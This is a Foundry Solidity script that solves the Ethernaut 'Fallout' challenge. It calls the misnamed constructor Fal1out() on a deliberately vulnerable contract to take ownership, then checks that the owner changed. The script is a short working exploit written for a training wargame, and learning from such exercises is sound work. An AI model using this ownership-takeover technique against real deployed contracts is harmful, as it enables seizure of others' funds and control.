// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {EthernautL3} from "../src/EthernautL3.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract EthernautL3Solution is Script {
    EthernautL3 public ethernautl3 = EthernautL3(0x0Af5633eCe77d5195238D2C867Ac2aF34d5edAFA);

    function run() public {
        // Check who is the owner of the contract
        address owner = ethernautl3.owner();  
        console.log("Owner is: ", owner);

        // We found out that the contructor can be called because it does not have the same name and thus change the owner
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ethernautl3.Fal1out();
        vm.stopBroadcast();

        // Check if the owner has changed
        address newOwner = ethernautl3.owner();
        require(newOwner != owner, "Owner has not changed");
        console.log("Owner has changed to: ", newOwner);

    }
}